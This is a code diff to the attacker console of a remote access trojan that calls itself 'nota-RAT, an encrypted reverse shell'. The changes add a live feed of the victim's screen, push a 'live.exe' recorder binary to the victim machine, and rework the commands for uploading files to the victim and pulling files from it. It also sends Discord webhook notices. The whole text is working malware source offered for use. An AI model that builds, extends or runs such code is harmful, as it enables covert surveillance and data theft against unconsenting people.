@@ -120,6 +120,10 @@ while True:
                 time.sleep(0.4)
                 exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
             if exit_choice == "y":
+                command = "/stoplive"
+                command = Fernet(key).encrypt(command.encode())
+                client_socket.send(command)
+                receiver.stop_server()
                 if args.discord:
                     webhook = DiscordWebhook(url=args.discord, content='@everyone')
                     embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
@@ -154,8 +158,8 @@ while True:
         \r  /help                       Print this message.
         \r  /getlive                    Gets a live feed of victim's screen.
         \r  /stoplive                   Stop the live feed of victim's screen.
-        \r  /send file                  Sends a file from the files directory in the attacker directory.
-        \r  /get file                   Gets a file from the victim's CWD and puts it into the files directory.
+        \r  /sendfile                  Sends a file from the files directory in the attacker directory.
+        \r  /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
         \r  /clear                      Clear screen.
         \r  exit/quit/q                  Close session and exit.
         {END}''')
@@ -185,11 +189,29 @@ while True:
                 client_socket.send(data)
             f.close()
         if command == "/getlive":
+            server_location = client_socket.recv(BUFFER_SIZE)
+            server_location = Fernet(key).decrypt(server_location).decode()
+            if server_location == "no":
+                print(f"\n[{IMPORTANT}] Transfering live recorder ......")
+                with open("live.exe", "rb") as f:
+                    data = f.read()
+                    dataLen = len(data)
+                    client_socket.send(dataLen.to_bytes(4,'big'))
+                    client_socket.send(data)
+                f.close()
+            if server_location == "yes":
+                print(f"\n[{IMPORTANT}] Found live Streaming Server in RAT CWD")
+            print(f"[{IMPORTANT}] Starting live Streaming Server ......")
             p = Thread(target=receiver.start_server)
             p.start()
+            server_state = client_socket.recv(BUFFER_SIZE)
+            server_state = Fernet(key).decrypt(server_state).decode()
+            print(f"[{IMPORTANT}] {server_state}")
+            continue
         if command == "/stoplive":
             receiver.stop_server()
             receiver = StreamingServer(IPAddr, 422)
+            continue
         output = client_socket.recv(BUFFER_SIZE)
         output = Fernet(key).decrypt(output).decode()
         results, cwd = output.split(SEPARATOR)
@@ -201,14 +223,21 @@ while True:
         while(exit_choice != "y" and exit_choice != "n"):
             print(f"[{FAILED}] (y/n) \n{END}")
             time.sleep(0.4)
-            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
+            exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
         if exit_choice == "y":
+            command = "/stoplive"
+            command = Fernet(key).encrypt(command.encode())
+            client_socket.send(command)
+            receiver.stop_server()
             commands = "exit"
             commands = Fernet(key).encrypt(commands.encode())
             client_socket.send(commands)
+            msg = client_socket.recv(BUFFER_SIZE)
+            msg = Fernet(key).decrypt(msg).decode()
+            client_socket.send(commands)
             client_socket.close()
             s.close()
-            print(f"\n[{EXIT}] {END}\n")
+            print(f"\n[{EXIT}] {msg}\n")
             break
         if exit_choice == "n":
             continue
